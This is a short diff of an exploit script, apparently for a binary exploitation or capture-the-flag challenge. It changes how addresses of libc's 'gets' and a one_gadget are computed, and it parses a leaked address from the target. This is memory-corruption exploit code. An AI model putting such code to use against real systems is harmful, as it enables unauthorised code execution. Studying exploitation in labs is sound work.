@@ -49,8 +49,8 @@ def get_base(leak, symbol, lib=True):
 
 
 # points of interest (POI)
-gets = rebase(libc.symbols['gets'])
-gadget = rebase(one_gadgets(libc_so)[choice])
+gets = libc.symbols['gets']
+gadget = one_gadgets(libc_so)[choice]
 
 # leaks
 leak = int(r.recv().strip().split(b' ')[0], 16)
